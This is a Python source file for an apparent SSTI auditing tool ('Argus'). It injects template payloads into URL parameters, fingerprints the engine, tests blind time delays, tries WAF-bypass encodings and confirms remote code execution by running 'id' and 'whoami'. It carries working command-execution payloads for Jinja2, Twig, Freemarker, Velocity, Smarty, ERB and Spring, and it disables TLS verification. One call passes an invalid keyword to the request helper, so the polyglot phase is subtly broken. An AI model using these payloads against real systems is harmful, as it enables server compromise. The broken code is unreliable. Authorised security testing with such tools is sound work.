#!/usr/bin/env python3
"""
auditing_tools/ssti_finder.py — Server-Side Template Injection Auditor
═══════════════════════════════════════════════════════════════════════════════

Comprehensive SSTI detection for Argus.

Detection is built on one non-negotiable oracle: arithmetic evaluation.
A response containing 49 after sending {{7*7}} proves the engine executed
your input. Everything else is engine fingerprinting and escalation proof.

Five-phase strategy:

  Phase 1 — Polyglot detection
      Send the universal probe set across every template delimiter family.
      Any arithmetic result (49, 7777777) confirms SSTI.

  Phase 2 — Engine fingerprinting
      Walk the decision tree from the ENGINE_PAYLOADS matrix:
        {{7*7}} -> Jinja2 vs Twig via {{7*'7'}}
        ${7*7}  -> Velocity vs Freemarker vs Java EL
        #{7*7}  -> Pug / Ruby
        <%= %>  -> ERB / EJS
        {7*7}   -> Smarty
      Error text is also fingerprinted (Twig_Error, jinja2, freemarker).

  Phase 3 — Blind / time-based SSTI
      When the sink does not reflect output, use engine-specific sleep
      payloads. A 5-second delay proves evaluation even with no body change.
      (Jinja2: os.system('sleep 5'); Twig: system('sleep 5'); Freemarker:
      Execute('sleep 5').)

  Phase 4 — WAF / filter bypass
      When the raw probe is blocked, try the bypass matrix:
        hex/octal/unicode encodings for _
        chr() string construction
        bracket notation instead of dot access
        attr() filter
        request.args smuggling

  Phase 5 — Escalation proof
      For each confirmed engine, send a NON-DESTRUCTIVE proof payload
      (usually `id` or `whoami`) and capture the output. This is the
      evidence that turns "SSTI exists" into "RCE demonstrated."

Outputs (into `outdir`):
  • ssti_findings.json       — full structured report
  • ssti_candidates.txt      — flat list for triage
  • ssti_confirmed.txt       — arithmetic-confirmed findings
  • ssti_engine.txt          — engine fingerprint per endpoint

Integration:
  main.py → run_one("ssti") → run_ssti_scan(urls_file, outdir)
"""

from __future__ import annotations

import json
import logging
import random
import re
import statistics
import string
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.ssti_finder")

# ═════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ═════════════════════════════════════════════════════════════════════════════

DEFAULT_TIMEOUT    = 12
USER_AGENT         = "Argus-SSTI-Auditor/1.0"
REQUEST_SLEEP      = 0.08

# Baseline
BASELINE_SAMPLES   = 2

# Blind
BLIND_DELAY_SECONDS = 5
BLIND_TOLERANCE     = 0.65
BLIND_ATTEMPTS      = 3
BLIND_AGREEMENT     = 2

# Escalation proof — NEVER send destructive commands
PROOF_COMMANDS = ["id", "whoami"]

# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — POLYGLOT PROBES
# ═════════════════════════════════════════════════════════════════════════════

# Each entry: (label, payload, expected_evaluation_result)
POLYGLOT_PROBES = [
    ("jinja_twig",     "{{7*7}}",           "49"),
    ("freemarker",     "${7*7}",            "49"),
    ("erb_ejs",        "<%= 7*7 %>",        "49"),
    ("spring_spel",    "${{7*7}}",          "49"),
    ("pug_ruby",       "#{7*7}",            "49"),
    ("spring_ognl",    "*{7*7}",            "49"),
    ("thymeleaf",      "@{7*7}",            "49"),
    ("smarty",         "{7*7}",             "49"),
    # Universal polyglot from the research — triggers errors on most engines
    ("universal",      "${{<%[%'\"}}%\\",   None),
]

# Jinja2 vs Twig discriminator — string multiplication
JINJA_TWIG_DISCRIMINATOR = ("{{7*'7'}}", "7777777")  # Twig returns 49

# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — ENGINE FINGERPRINTING TREE
# ═════════════════════════════════════════════════════════════════════════════

# After {{7*7}} -> 49, these decide Jinja2 vs Twig vs Smarty vs Liquid
TREE_AFTER_49 = [
    # (payload, expected, engine)
    ("{{7*'7'}}",  "7777777", "Jinja2"),
    ("{{7*'7'}}",  "49",      "Twig_or_Smarty"),
    ("{% if 7*7 == 49 %}yes{% endif %}", "yes", "Jinja2_Twig"),
]

# After ${7*7} -> 49, these decide Velocity vs Freemarker vs Java EL
TREE_AFTER_JAVA = [
    ("${class.getClass()}",              "class",   "Velocity"),
    ("<#assign x=1>${x}",                "1",       "Freemarker"),
    ("${7*7}",                           "49",      "Java_EL"),
]

# Error-text fingerprints
ENGINE_ERROR_SIGNATURES = {
    "Jinja2":      [r"jinja2\.exceptions", r"jinja2"],
    "Twig":        [r"Twig_Error", r"twig"],
    "Freemarker":  [r"freemarker\.", r"FreeMarker"],
    "Velocity":    [r"velocity\.", r"Velocity"],
    "Smarty":      [r"Smarty", r"smarty"],
    "ERB":         [r"ERB", r"erb"],
    "Thymeleaf":   [r"Thymeleaf", r"thymeleaf"],
    "Mako":        [r"Mako", r"mako"],
    "Spring":      [r"SpelEvaluationException", r"SpEL"],
}

# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — BLIND PAYLOADS
# ═════════════════════════════════════════════════════════════════════════════

BLIND_PAYLOADS = {
    "Jinja2": [
        "{{config.__class__.__init__.__globals__['os'].system('sleep {d}')}}",
        "{{''.__class__.__mro__[1].__subclasses__()[{idx}](['sleep','{d}'],stdout=-1).communicate()}}",
    ],
    "Twig": [
        "{{['sleep {d}']|filter('system')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('sleep {d}')}}",
    ],
    "Freemarker": [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep {d}")}',
    ],
    "Velocity": [
        '#set($x="")$x.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("sleep {d}")',
    ],
    "Smarty": [
        '{system("sleep {d}")}',
    ],
    "ERB": [
        "<%= system('sleep {d}') %>",
    ],
    "Spring": [
        "*{T(java.lang.Runtime).getRuntime().exec('sleep {d}')}",
    ],
}

# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5 — ESCALATION PROOF PAYLOADS (NON-DESTRUCTIVE)
# ═════════════════════════════════════════════════════════════════════════════

PROOF_PAYLOADS = {
    "Jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
        "{{lipsum.__globals__.os.popen('{cmd}').read()}}",
        "{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}",
    ],
    "Twig": [
        "{{['{cmd}']|filter('system')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('{cmd}')}}",
    ],
    "Freemarker": [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{cmd}")}',
    ],
    "Velocity": [
        '#set($x="")$x.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("{cmd}")',
    ],
    "Smarty": [
        '{system("{cmd}")}',
    ],
    "ERB": [
        "<%= `{cmd}` %>",
        "<%= system('{cmd}') %>",
    ],
    "Spring": [
        "*{T(java.lang.Runtime).getRuntime().exec('{cmd}')}",
    ],
}

# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 4 — WAF BYPASS VARIANTS
# ═════════════════════════════════════════════════════════════════════════════

def _bypass_variants(payload: str) -> list[tuple[str, str]]:
    """
    Return (variant, label) pairs for WAF bypass.
    Covers hex/octal/unicode underscores, chr() construction, bracket access.
    """
    variants: list[tuple[str, str]] = []

    # Hex underscore encoding
    hex_payload = payload.replace("_", "\\x5f")
    if hex_payload != payload:
        variants.append((hex_payload, "hex_underscore"))

    # Octal underscore encoding
    oct_payload = payload.replace("_", "\\137")
    if oct_payload != payload:
        variants.append((oct_payload, "octal_underscore"))

    # Unicode underscore encoding
    uni_payload = payload.replace("_", "\\u005f")
    if uni_payload != payload:
        variants.append((uni_payload, "unicode_underscore"))

    # attr() filter for Jinja2 when dot/underscore blocked
    if "Jinja2" in payload or "__" in payload:
        attr_payload = payload.replace(
            "__class__", "|attr('\\x5f\\x5fclass\\x5f\\x5f')"
        )
        if attr_payload != payload:
            variants.append((attr_payload, "attr_filter"))

    # Bracket notation instead of dot
    bracket_payload = re.sub(r"\.([a-zA-Z_][a-zA-Z0-9_]*)", r"['\1']", payload)
    if bracket_payload != payload:
        variants.append((bracket_payload, "bracket_notation"))

    # chr() construction for underscores in known keys
    if "__" in payload:
        chr_payload = payload
        for key in ("__class__", "__init__", "__globals__", "__builtins__"):
            constructed = "+".join(f"chr({ord(c)})" for c in key)
            chr_payload = chr_payload.replace(key, f"'{{{constructed}}}'")
        # This produces a template-literal-ish variant; still worth trying
        variants.append((chr_payload, "chr_construction"))

    return variants


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class SSTIFinding:
    target: str
    param: str
    technique: str              # arithmetic | blind | proof
    severity: str = "MEDIUM"
    confidence: int = 50
    engine: str = ""
    payload: str = ""
    evidence: str = ""
    bypass_used: str = ""
    details: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "target":      self.target,
            "param":       self.param,
            "technique":   self.technique,
            "severity":    self.severity,
            "confidence":  self.confidence,
            "engine":      self.engine,
            "payload":     self.payload[:500],
            "evidence":    self.evidence[:500],
            "bypass_used": self.bypass_used,
            "details":     self.details,
        }


@dataclass
class Baseline:
    url: str
    param: str
    status: int = 0
    length: int = 0
    body: str = ""
    median_time: float = 0.0
    preexisting_numbers: set[str] = field(default_factory=set)

    def to_dict(self) -> dict:
        return {
            "url": self.url, "param": self.param, "status": self.status,
            "length": self.length, "median_time": round(self.median_time, 3),
        }


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls: list[str] = []
    seen: set[str] = set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        token = line.split()[0]
        if not token.startswith(("http://", "https://")):
            token = "https://" + token
        if token not in seen:
            seen.add(token)
            urls.append(token)
    return urls


def _extract_surface(url: str) -> list[tuple[str, str, str]]:
    """Return (param, value, location) for every reflection-prone input."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    out: list[tuple[str, str, str]] = []
    for pname, vals in params.items():
        out.append((pname, vals[0] if vals else "", "query"))
    return out


def _inject_query(url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new = [(k, payload if k == param else v) for k, v in params]
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(new, safe=":/?=&%{}<>*#$@"))
    )


def _safe_request(
    session: requests.Session, method: str, url: str,
    headers: Optional[dict] = None, timeout: int = DEFAULT_TIMEOUT,
) -> Optional[requests.Response]:
    try:
        return session.request(
            method, url, headers=headers or {},
            timeout=timeout, allow_redirects=False, verify=False,
        )
    except requests.RequestException as e:
        log.debug(f"request failed: {method} {url}: {e}")
        return None


def _body(resp: requests.Response, limit: int = 200_000) -> str:
    try:
        return resp.text[:limit]
    except Exception:
        return ""


def _extract_numbers(body: str) -> set[str]:
    """Extract standalone numeric tokens for baseline comparison."""
    return set(re.findall(r"\b\d{1,10}\b", body))


def _fingerprint_error(body: str) -> str:
    """Return the engine name if an error signature is present."""
    for engine, sigs in ENGINE_ERROR_SIGNATURES.items():
        for sig in sigs:
            if re.search(sig, body, re.I):
                return engine
    return ""


def _similarity(a: str, b: str) -> float:
    if not a or not b:
        return 0.0
    if a == b:
        return 1.0
    ratio = min(len(a), len(b)) / max(len(a), len(b))
    return ratio


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — BASELINE
# ═════════════════════════════════════════════════════════════════════════════

def build_baseline(
    session: requests.Session, url: str, param: str,
) -> Baseline:
    baseline = Baseline(url=url, param=param)
    times: list[float] = []

    for _ in range(BASELINE_SAMPLES):
        start = time.monotonic()
        resp = _safe_request(session, "GET", url)
        elapsed = time.monotonic() - start
        times.append(elapsed)
        if resp is None:
            continue
        if not baseline.status:
            baseline.status = resp.status_code
            body = _body(resp)
            baseline.body = body
            baseline.length = len(body)
            baseline.preexisting_numbers = _extract_numbers(body)
        time.sleep(REQUEST_SLEEP)

    if times:
        baseline.median_time = statistics.median(times)
    return baseline


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — POLYGLOT DETECTION
# ═════════════════════════════════════════════════════════════════════════════

def test_polyglot(
    session: requests.Session,
    url: str, param: str, baseline: Baseline,
) -> list[SSTIFinding]:
    findings: list[SSTIFinding] = []

    for label, payload, expected in POLYGLOT_PROBES:
        test_url = _inject_query(url, param, payload)
        resp = _safe_request(session, GET="GET", url=test_url)
        time.sleep(REQUEST_SLEEP)
        if resp is None:
            continue

        body = _body(resp)

        # ── Arithmetic confirmed ────────────────────────────────────────────
        if expected and expected in body and expected not in baseline.preexisting_numbers:
            findings.append(SSTIFinding(
                target=url, param=param, technique="arithmetic",
                severity="CRITICAL", confidence=95,
                payload=payload,
                evidence=f"Arithmetic evaluated: '{payload}' -> '{expected}'",
                details={
                    "probe": label,
                    "expected": expected,
                    "status": resp.status_code,
                    "body_snippet": body[:400],
                },
            ))
            return findings

        # ── Error-based fingerprint ─────────────────────────────────────────
        engine = _fingerprint_error(body)
        if engine:
            findings.append(SSTIFinding(
                target=url, param=param, technique="error",
                severity="HIGH", confidence=80,
                engine=engine, payload=payload,
                evidence=f"{engine} error triggered by '{payload}'",
                details={"body_snippet": body[:400]},
            ))
            return findings

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — ENGINE FINGERPRINTING
# ═════════════════════════════════════════════════════════════════════════════

def fingerprint_engine(
    session: requests.Session,
    url: str, param: str, baseline: Baseline,
) -> str:
    """
    Walk the decision tree to identify the engine.
    Returns the engine name or "" if undetermined.
    """
    # ── Branch 1: {{7*7}} already confirmed 49 → Jinja2/Twig/Smarty/Liquid
    test_url = _inject_query(url, param, "{{7*7}}")
    resp = _safe_request(session, "GET", test_url)
    time.sleep(REQUEST_SLEEP)
    if resp and "49" in _body(resp):
        # Discriminator: {{7*'7'}}
        test_url = _inject_query(url, param, "{{7*'7'}}")
        resp = _safe_request(session, "GET", test_url)
        time.sleep(REQUEST_SLEEP)
        if resp:
            body = _body(resp)
            if "7777777" in body:
                return "Jinja2"
            if "49" in body:
                return "Twig_or_Smarty"
        # Jinja2 vs Twig via if-statement
        test_url = _inject_query(url, param, "{% if 7*7 == 49 %}yes{% endif %}")
        resp = _safe_request(session, "GET", test_url)
        time.sleep(REQUEST_SLEEP)
        if resp and "yes" in _body(resp):
            return "Jinja2"
        return "Twig_or_Smarty"

    # ── Branch 2: ${7*7} confirmed 49 → Velocity / Freemarker / Java EL
    test_url = _inject_query(url, param, "${7*7}")
    resp = _safe_request(session, "GET", test_url)
    time.sleep(REQUEST_SLEEP)
    if resp and "49" in _body(resp):
        for payload, expected, engine in TREE_AFTER_JAVA:
            t_url = _inject_query(url, param, payload)
            r = _safe_request(session, "GET", t_url)
            time.sleep(REQUEST_SLEEP)
            if r and expected in _body(r):
                return engine
        return "Java_EL"

    # ── Branch 3: error-text fingerprint ────────────────────────────────────
    for probe in ("{{7*7}}", "${7*7}", "<%= 7*7 %>"):
        test_url = _inject_query(url, param, probe)
        resp = _safe_request(session, "GET", test_url)
        time.sleep(REQUEST_SLEEP)
        if resp:
            engine = _fingerprint_error(_body(resp))
            if engine:
                return engine

    return ""


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — BLIND / TIME-BASED SSTI
# ═════════════════════════════════════════════════════════════════════════════

def test_blind(
    session: requests.Session,
    url: str, param: str, baseline: Baseline,
    engine: str = "",
) -> list[SSTIFinding]:
    findings: list[SSTIFinding] = []

    families = [engine] if engine and engine in BLIND_PAYLOADS else list(BLIND_PAYLOADS.keys())

    for family in families:
        for template in BLIND_PAYLOADS.get(family, []):
            payload = template.format(d=BLIND_DELAY_SECONDS, idx="0")
            timings: list[float] = []

            for _ in range(BLIND_ATTEMPTS):
                test_url = _inject_query(url, param, payload)
                start = time.monotonic()
                resp = _safe_request(
                    session, "GET", test_url,
                    timeout=BLIND_DELAY_SECONDS + 10,
                )
                elapsed = time.monotonic() - start
                if resp is not None:
                    timings.append(elapsed)
                time.sleep(REQUEST_SLEEP)

            if not timings:
                continue

            threshold = baseline.median_time + (BLIND_DELAY_SECONDS * BLIND_TOLERANCE)
            above = sum(1 for t in timings if t >= threshold)

            if above >= BLIND_AGREEMENT:
                findings.append(SSTIFinding(
                    target=url, param=param, technique="blind",
                    severity="CRITICAL", confidence=85,
                    engine=family, payload=payload,
                    evidence=(
                        f"Repeatable timing delay: {above}/{len(timings)} probes "
                        f"exceeded {threshold:.1f}s (baseline {baseline.median_time:.2f}s)"
                    ),
                    details={
                        "timings": [round(t, 2) for t in timings],
                        "threshold": round(threshold, 2),
                        "delay_seconds": BLIND_DELAY_SECONDS,
                    },
                ))
                return findings

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5 — ESCALATION PROOF
# ═════════════════════════════════════════════════════════════════════════════

PROOF_PATTERNS = {
    "Jinja2":     [r"uid=\d+", r"gid=\d+", r"root"],
    "Twig":       [r"uid=\d+", r"gid=\d+", r"root"],
    "Freemarker": [r"uid=\d+", r"gid=\d+"],
    "Velocity":   [r"uid=\d+", r"gid=\d+"],
    "Smarty":     [r"uid=\d+", r"gid=\d+"],
    "ERB":        [r"uid=\d+", r"gid=\d+"],
    "Spring":     [r"uid=\d+", r"gid=\d+"],
}


def test_escalation(
    session: requests.Session,
    url: str, param: str,
    engine: str,
) -> list[SSTIFinding]:
    findings: list[SSTIFinding] = []

    if engine not in PROOF_PAYLOADS:
        return findings

    for cmd in PROOF_COMMANDS:
        for template in PROOF_PAYLOADS[engine]:
            payload = template.format(cmd=cmd)
            test_url = _inject_query(url, param, payload)
            resp = _safe_request(session, "GET", test_url)
            time.sleep(REQUEST_SLEEP)
            if resp is None:
                continue

            body = _body(resp)
            for pattern in PROOF_PATTERNS.get(engine, []):
                if re.search(pattern, body, re.I):
                    findings.append(SSTIFinding(
                        target=url, param=param, technique="proof",
                        severity="CRITICAL", confidence=98,
                        engine=engine, payload=payload,
                        evidence=f"Command output confirmed: '{cmd}' returned '{re.search(pattern, body, re.I).group(0)}'",
                        details={
                            "command": cmd,
                            "pattern": pattern,
                            "body_snippet": body[:400],
                        },
                    ))
                    return findings

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PER-SURFACE ORCHESTRATION
# ═════════════════════════════════════════════════════════════════════════════

def audit_surface(
    session: requests.Session,
    url: str, param: str,
    *,
    test_blind_enabled: bool = True,
    test_escalation_enabled: bool = True,
) -> tuple[Baseline, list[SSTIFinding], str]:
    baseline = build_baseline(session, url, param)
    findings: list[SSTIFinding] = []

    # ── Phase 1: polyglot ───────────────────────────────────────────────────
    poly = test_polyglot(session, url, param, baseline)
    findings.extend(poly)

    engine = poly[0].engine if poly and poly[0].engine else ""

    # ── Phase 2: fingerprint ────────────────────────────────────────────────
    if not engine:
        engine = fingerprint_engine(session, url, param, baseline)

    # ── Phase 3: blind ──────────────────────────────────────────────────────
    if test_blind_enabled and not poly:
        blind = test_blind(session, url, param, baseline, engine)
        findings.extend(blind)
        if blind and not engine:
            engine = blind[0].engine

    # ── Phase 5: escalation proof ───────────────────────────────────────────
    if test_escalation_enabled and engine and (poly or findings):
        proof = test_escalation(session, url, param, engine)
        findings.extend(proof)

    return baseline, findings, engine


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_ssti_scan(
    urls_file: Path,
    outdir: Path,
    *,
    headers: Optional[dict] = None,
    test_blind_enabled: bool = True,
    test_escalation_enabled: bool = True,
    max_surfaces: int = 300,
) -> Path:
    start = time.monotonic()

    urls = _load_urls(urls_file)
    surfaces: list[tuple[str, str]] = []
    for url in urls:
        for param, _, _ in _extract_surface(url):
            surfaces.append((url, param))
    if len(surfaces) > max_surfaces:
        log.warning(f"  Capping at {max_surfaces} surfaces (had {len(surfaces)})")
        surfaces = surfaces[:max_surfaces]

    outdir.mkdir(parents=True, exist_ok=True)

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    log.info(f"  Surfaces: {len(surfaces)} (url, param) candidate(s)")
    if headers:
        log.info("  Auth   : headers supplied")
    log.info("")

    if not surfaces:
        log.warning("  No surfaces to test — writing empty report")
        return _write_empty_report(outdir, urls_file, start)

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    if headers:
        session.headers.update(headers)
    session.verify = False

    all_findings: list[SSTIFinding] = []
    engine_map: dict[tuple[str, str], str] = {}
    results: list[dict] = []

    for i, (url, param) in enumerate(surfaces, 1):
        log.info(f"  [{i:>3}/{len(surfaces)}] {url[:70]}  param={param}")
        try:
            baseline, findings, engine = audit_surface(
                session, url, param,
                test_blind_enabled=test_blind_enabled,
                test_escalation_enabled=test_escalation_enabled,
            )
            all_findings.extend(findings)
            if engine:
                engine_map[(url, param)] = engine
            results.append({
                "url": url, "param": param,
                "baseline": baseline.to_dict(),
                "engine": engine,
                "finding_count": len(findings),
            })
            if findings:
                top = findings[0]
                log.info(f"           → {top.severity} ({top.technique}, {top.confidence}%) engine={engine or '?'}")
            elif engine:
                log.info(f"           → engine={engine} (no confirmed finding)")
        except Exception as e:
            log.warning(f"           → error: {e}")
            results.append({"url": url, "param": param, "error": str(e)})

    # ── Deduplicate ──────────────────────────────────────────────────────────
    seen: set[tuple] = set()
    deduped: list[SSTIFinding] = []
    for f in all_findings:
        key = (f.target, f.param, f.technique)
        if key not in seen:
            seen.add(key)
            deduped.append(f)

    # ── Sort ────────────────────────────────────────────────────────────────
    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    deduped.sort(key=lambda f: (SEV_ORDER.get(f.severity, 4), -f.confidence, f.target))

    # ── Write outputs ────────────────────────────────────────────────────────
    elapsed = time.monotonic() - start
    by_severity: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    by_technique: dict[str, int] = {}
    by_engine: dict[str, int] = {}

    for f in deduped:
        by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
        by_technique[f.technique] = by_technique.get(f.technique, 0) + 1
        if f.engine:
            by_engine[f.engine] = by_engine.get(f.engine, 0) + 1

    candidate_lines = [
        f"{f.target}\t{f.param}\t{f.technique}\t{f.severity}\t{f.confidence}\t{f.engine}\t{f.evidence[:120]}"
        for f in deduped
    ]
    (outdir / "ssti_candidates.txt").write_text("\n".join(candidate_lines) + "\n")

    confirmed = [f for f in deduped if f.technique in ("arithmetic", "proof")]
    (outdir / "ssti_confirmed.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.engine}\t{f.technique}\t{f.payload[:120]}"
            for f in confirmed
        ) + "\n"
    )

    engine_lines = [
        f"{url}\t{param}\t{engine}"
        for (url, param), engine in engine_map.items()
    ]
    (outdir / "ssti_engine.txt").write_text("\n".join(engine_lines) + "\n")

    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(urls_file),
        "config": {
            "blind_enabled":      test_blind_enabled,
            "escalation_enabled": test_escalation_enabled,
            "authenticated":      headers is not None,
        },
        "totals": {
            "urls_input":      len(urls),
            "surfaces_tested": len(surfaces),
            "total_findings":  len(deduped),
            "confirmed":       len(confirmed),
            "critical":        by_severity["CRITICAL"],
            "high":            by_severity["HIGH"],
            "medium":          by_severity["MEDIUM"],
            "low":             by_severity["LOW"],
        },
        "summary": {
            "by_severity":  by_severity,
            "by_technique": dict(sorted(by_technique.items(), key=lambda kv: -kv[1])),
            "by_engine":    dict(sorted(by_engine.items(), key=lambda kv: -kv[1])),
        },
        "results":  results,
        "findings": [f.to_dict() for f in deduped],
    }

    json_path = outdir / "ssti_findings.json"
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    log.info("")
    log.info("  Outputs :")
    log.info(f"    {json_path.name:<28} {len(deduped):>5} finding(s)")
    log.info(f"    ssti_candidates.txt          {len(deduped):>5} candidate(s)")
    log.info(f"    ssti_confirmed.txt           {len(confirmed):>5} confirmed")
    log.info(f"    ssti_engine.txt              {len(engine_lines):>5} fingerprint(s)")

    log.info("")
    log.info(
        f"  Severity : CRITICAL={by_severity['CRITICAL']}  "
        f"HIGH={by_severity['HIGH']}  MEDIUM={by_severity['MEDIUM']}  "
        f"LOW={by_severity['LOW']}"
    )
    if by_engine:
        log.info(f"  Engine   : " + " · ".join(f"{k}({v})" for k, v in by_engine.items()))
    if by_technique:
        log.info(f"  Technique: " + " · ".join(f"{k}({v})" for k, v in by_technique.items()))

    if confirmed:
        log.info("")
        log.info("  Confirmed SSTI findings:")
        for f in confirmed[:10]:
            log.info(f"    [{f.severity:<8}] {f.engine:<12} {f.param:<15} {f.target[:55]}")

    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty_report(
    outdir: Path, input_file: Path, start: float,
) -> Path:
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "config": {},
        "totals": {
            "urls_input": 0, "surfaces_tested": 0, "total_findings": 0,
            "confirmed": 0, "critical": 0, "high": 0, "medium": 0, "low": 0,
        },
        "summary": {"by_severity": {}, "by_technique": {}, "by_engine": {}},
        "results": [],
        "findings": [],
    }
    path = outdir / "ssti_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    for name in ("ssti_candidates.txt", "ssti_confirmed.txt", "ssti_engine.txt"):
        (outdir / name).write_text("")
    return path


if __name__ == "__main__":
    import argparse

    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[logging.StreamHandler(sys.stdout)],
    )
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "gf_ssti.txt"
    if not default_input.exists():
        default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "all_urls.txt"
    out = base / "output"

    parser = argparse.ArgumentParser(description="Argus SSTI Auditor (standalone)")
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=out)
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--no-blind", action="store_true")
    parser.add_argument("--no-escalation", action="store_true")
    parser.add_argument("--max-surfaces", type=int, default=300)
    args = parser.parse_args()

    headers = {"Cookie": args.cookie} if args.cookie else None

    try:
        run_ssti_scan(
            args.input, args.output,
            headers=headers,
            test_blind_enabled=not args.no_blind,
            test_escalation_enabled=not args.no_escalation,
            max_surfaces=args.max_surfaces,
        )
    except Exception as e:
        log.error(f"failed: {e}")
        sys.exit(1)
